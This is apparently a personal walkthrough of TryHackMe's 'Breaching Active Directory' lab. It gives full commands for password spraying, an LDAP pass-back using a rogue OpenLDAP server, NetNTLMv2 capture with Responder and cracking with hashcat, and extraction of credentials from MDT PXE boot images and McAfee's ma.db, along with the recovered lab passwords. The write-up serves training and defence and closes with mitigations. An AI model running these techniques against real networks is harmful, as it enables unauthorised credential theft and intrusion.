# Breaching Active Directory — TryHackMe Network Walkthrough

> **Platform:** TryHackMe · **Category:** Networks · **Room:** Breaching Active Directory  
> **Environment:** Kali Linux (VMware), Windows jump host, Active Directory lab  
> **Focus:** Initial AD credential access, password spraying, LDAP pass-back, NetNTLMv2 capture, PXE/MDT deployment images, and application configuration files

<img width="2101" height="278" alt="forside" src="https://github.com/user-attachments/assets/108e8f58-f497-48bd-8025-40b9dd932db1" />


## Overview

This walkthrough documents my hands-on work in TryHackMe's **Breaching Active Directory** network. The objective was to investigate several ways that an attacker with network access or a foothold on a host could obtain an initial set of Active Directory credentials.

Rather than relying on a single technique, the lab demonstrated how credentials can be exposed through authentication endpoints, peripheral devices, network authentication traffic, deployment infrastructure, and local application configuration.

**Scope:** All activity described here was performed in the authorised TryHackMe lab. The addresses, passwords, and accounts below are lab-specific. This is a learning record, not a guide to target real systems without permission.

## Lab setup and connectivity

I worked from a Kali Linux VM and connected to the TryHackMe network using the room-specific OpenVPN configuration.

```bash
sudo openvpn ~/Downloads/<your-lab-profile>.ovpn
```

A successful connection created the `breachad` interface. In my session, Kali received `10.150.70.5/24` and reached the target network through `10.150.70.1`.

```bash
ip -br addr show breachad
ip route get 10.200.70.248
```

The lab used an internal DNS server (`10.200.70.101`). My VM's ordinary DNS server could not resolve the `za.tryhackme.com` hostnames, so I queried the lab DNS server directly and added the relevant hostnames to `/etc/hosts` where needed.

```bash
nslookup ntlmauth.za.tryhackme.com 10.200.70.101
nslookup thmmdt.za.tryhackme.com 10.200.70.101
```

### Lab systems referenced

| System or service | Address used in my session | Purpose |
| --- | --- | --- |
| Lab DNS | `10.200.70.101` | Resolve internal AD hostnames |
| NTLM web service / printer web interface | `10.200.70.201` | Password spraying and LDAP pass-back exercises |
| MDT / TFTP server (`THMMDT`) | `10.200.70.202` | PXE boot artifacts |
| Windows jump host (`THMJMP1`) | `10.200.70.248` | Remote Windows environment and McAfee database |
| Kali VPN interface (`breachad`) | `10.150.70.5` | Lab-side listener and traffic capture |

*These are addresses from one lab session; a new TryHackMe session may use different addresses or regenerated file names.*

---

## Task 3 — Password spraying against NTLM authentication

The first technique I tested was **password spraying**: trying one candidate password against many usernames rather than trying many passwords against one user account. This distinction matters because account lockout policies commonly respond to repeated failures against an individual account.

I used the supplied usernames and `ntlm_passwordspray.py` script. Since the script required an additional Python dependency, I created an isolated virtual environment.

```bash
cd ~/THM/BreachingAD/task3
python3 -m venv .venv
source .venv/bin/activate
python -m pip install requests-ntlm
```

I then ran the password spray against the lab's NTLM authentication service:

```bash
python ntlm_passwordspray.py \
  -u usernames.txt \
  -f za.tryhackme.com \
  -p Changeme123 \
  -a http://ntlmauth.za.tryhackme.com/
```

The script identified **four accounts** using the tested password:

```text
hollie.powell
heather.smith
gordon.stevens
georgina.edwards
```

**Result:** The exercise demonstrated that weak or shared passwords can expose multiple accounts without the attacker needing to guess a different password for each user.

---

## Task 4 — LDAP pass-back via a printer configuration page

For this task, the lab provided access to a printer administration interface:

```text
http://printer.za.tryhackme.com/settings.aspx
```

The printer had a configured LDAP service account, `svcLDAP`, but the password was masked in the web interface. The configuration allowed the LDAP server address to be changed. I pointed the printer's LDAP connection at my Kali VPN address (`10.150.70.5`) and used the *Test Settings* function to trigger authentication.

A basic listener confirmed that the printer connected to my machine:

```bash
nc -lvp 389
```

The connection alone was not sufficient to recover the credentials. I configured a local OpenLDAP service to advertise authentication mechanisms suitable for demonstrating the lab's LDAP pass-back vulnerability.

```bash
sudo apt update
sudo apt install slapd ldap-utils
sudo dpkg-reconfigure -p low slapd
```

I then created `olcSaslSecProps.ldif`:

```ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Applied the configuration and restarted the service:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
sudo systemctl restart slapd
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

The server advertised `LOGIN` and `PLAIN`. I then captured traffic over the TryHackMe VPN interface while testing the printer connection again:

```bash
sudo tcpdump -SX -i breachad 'tcp port 389'
```

The traffic disclosed the lab service account credentials:

```text
Account: ZA\svcLDAP
Password: tryhackmeldappass1@
```

**Result:** A device that stores a credential can become an exposure point if an attacker can redirect its authentication request and the connection does not adequately protect the secret.

---

## Task 5 — Capturing and cracking a NetNTLMv2 response

Next, I used **Responder** on the `breachad` interface to capture authentication activity in the lab.

```bash
sudo responder -I breachad
```

Responder received an SMB NetNTLMv2 challenge-response from the lab and identified the account:

```text
Client: 10.200.70.202
User:   ZA\svcFileCopy
Type:   NTLMv2-SSP
```

The captured data was written to Responder's log directory. I extracted the relevant response into `hash.txt` and tested it against the supplied small wordlist using Hashcat mode `5600` (NetNTLMv2).

```bash
sudo grep -h '^svcFileCopy::ZA:' \
  /usr/share/responder/logs/*NTLMv2* \
  | head -n 1 > ~/THM/BreachingAD/task5/hash.txt

cd ~/THM/BreachingAD/task5
hashcat -m 5600 -a 0 hash.txt passwordlist-1647876320267.txt
```

Hashcat recovered the account password:

```text
Account:  svcFileCopy
Password: FPassword1!
```

**Result:** A captured NetNTLMv2 response is not a plaintext password. However, weak passwords may be recovered by testing guesses offline against the recorded challenge-response.

---

## Task 6 — Recovering credentials from an MDT PXE boot image

The Microsoft Deployment Toolkit (**MDT**) can deploy Windows through network booting (**PXE**). In this task, I investigated whether deployment files available over **TFTP** contained credentials in their configuration.

I connected to the lab's Windows jump host:

```bash
ssh thm@10.200.70.248
```

Inside the Windows command prompt, I created a working directory and copied in the provided PowerPXE module:

```cmd
cd Documents
mkdir camilla
copy C:\powerpxe\PowerPXE.ps1 camilla\
cd camilla
```

### 6.1 Retrieve the boot configuration file (BCD)

The PXE web listing at `http://pxeboot.za.tryhackme.com/` exposed several BCD filenames. I selected the `x64` entry and downloaded it via TFTP from the MDT server:

```cmd
tftp -i 10.200.70.202 GET "\Tmp\x64{801F540E-6EF5-4884-B307-5A1AD6D6A1D2}.bcd" conf.bcd
dir conf.bcd
```

```text
Transfer successful: 12288 bytes in 1 second(s)
```

<img width="1621" height="951" alt="1" src="https://github.com/user-attachments/assets/c1d5ede6-c87d-4e96-bcb7-63f559889491" />


**Note:** The BCD GUID shown here was generated for my lab instance. It should be read from the current PXE listing rather than assumed to be permanent.

### 6.2 Locate the WIM image using PowerPXE

I opened PowerShell with the execution policy required for this lab and imported the module:

```powershell
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

PowerPXE extracted the Windows image path from the BCD configuration:

```text
\Boot\x64\Images\LiteTouchPE_x64.wim
```

> <img width="1793" height="1175" alt="2" src="https://github.com/user-attachments/assets/e6b6ad7d-7b31-46d3-9630-0a32c9eb92fc" /> PowerPXE identifying `LiteTouchPE_x64.wim` from `conf.bcd`.



### 6.3 Download and inspect the WIM file

Using the recovered WIM path, I retrieved the boot image via TFTP:

```powershell
tftp -i 10.200.70.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

The transfer completed successfully:

```text
Transfer successful: 341899611 bytes in 345 second(s)
```

> 📸 **Image placeholder — `3.png`:** The Windows PowerShell session initiating the WIM download.

Finally, I searched the local boot image for embedded deployment credentials:

```powershell
Get-FindCredentials -WimFile pxeboot.wim
```

```text
DeployRoot   = \\THMMDT\MTDBuildLab$
UserID       = svcMDT
UserDomain   = ZA
UserPassword = PXEBootSecure1@
```

**Result:** The MDT boot image contained a `Bootstrap.ini` with a service account and password. The risk is not PXE itself, but sensitive credentials being embedded in deployment artifacts that other systems can retrieve.

---

## Task 7 — Credentials in McAfee configuration files

The final technical task focused on **credentials stored in centrally deployed application configuration**. The lab used McAfee Agent's SQLite database, `ma.db`, on `THMJMP1`.

### 7.1 Copy `ma.db` from the jump host

From Kali, I created a folder for the task and transferred the database using SCP:

```bash
mkdir -p ~/THM/BreachingAD/task7
cd ~/THM/BreachingAD/task7
scp thm@10.200.70.248:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

I confirmed that the downloaded file was a SQLite database:

```bash
file ma.db
```

### 7.2 Query the stored repository credentials

Instead of using a graphical SQLite browser, I queried the `AGENT_REPOSITORIES` table with Python:

```bash
python3 - <<'PY'
import sqlite3

con = sqlite3.connect('ma.db')
for row in con.execute('''
    SELECT rowid, DOMAIN, AUTH_USER, AUTH_PASSWD
    FROM AGENT_REPOSITORIES
'''):
    print(row)
con.close()
PY
```

The second record contained:

```text
DOMAIN:      za.tryhackme.com
AUTH_USER:   svcAV
AUTH_PASSWD: jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

The `AUTH_PASSWD` value was not plaintext. The lab provided a McAfee-specific password decryption tool for this legacy storage scheme.

### 7.3 Decrypt the stored password

I used the Python 3-compatible version in an isolated virtual environment:

```bash
git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption.git
cd mcafee-sitelist-pwd-decryption
python3 -m venv .venv
./.venv/bin/pip install pycryptodomex
./.venv/bin/python mcafee_sitelist_pwd_decrypt.py \
  'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
```

The tool returned:

```text
Decrypted password : MyStrongPassword!
```

> <img width="999" height="83" alt="4" src="https://github.com/user-attachments/assets/ddce5c37-4b25-49dd-9195-55704bf19d8f" /> Successful McAfee password decryption in Kali.


**Result:** Encrypting a credential in a local application database does not guarantee its protection if the corresponding decryption mechanism is known or recoverable.

---

## Summary of findings

| Technique | Exposed account(s) | Main weakness demonstrated |
| --- | --- | --- |
| NTLM password spraying | Four AD users | Reused / weak account passwords |
| LDAP pass-back | `svcLDAP` | Device-controlled authentication destination and insufficient transport protection |
| SMB / NetNTLMv2 capture | `svcFileCopy` | Exposed authentication exchanges and guessable password |
| MDT / PXE boot image | `svcMDT` | Credentials embedded in retrievable deployment artifacts |
| McAfee `ma.db` | `svcAV` | Recoverable application-stored credentials |

## Defensive takeaways

This network made it clear that the **first set of AD credentials can come from much more than an interactive login form**. In an enterprise environment, identity exposure can also originate from printers, deployment systems, service accounts, and endpoint management software.

The most relevant mitigations are to enforce strong, unique passwords; limit unnecessary NTLM exposure; restrict and monitor name-resolution and authentication traffic; secure LDAP with appropriate transport protections; prevent unauthorised changes to devices' authentication endpoints; remove hardcoded passwords from deployment images; protect deployment shares; and minimise the privileges and local exposure of service-account credentials.

It was especially useful to compare the techniques: some exposed **plaintext credentials directly**, while others exposed **authentication material that required offline password recovery**. Understanding that difference is important when evaluating the actual severity of an incident.

## Tools used

`OpenVPN` · `Python 3` · `requests-ntlm` · `OpenLDAP` · `tcpdump` · `Responder` · `Hashcat` · `SSH/SCP` · `TFTP` · `PowerShell` · `PowerPXE` · `SQLite`

---

*Author's note: This walkthrough is based on my own observations and command output from the TryHackMe lab. Screenshots are marked by placeholders using their **original filenames** and can be inserted into the repository's `images/` directory without renaming them.*
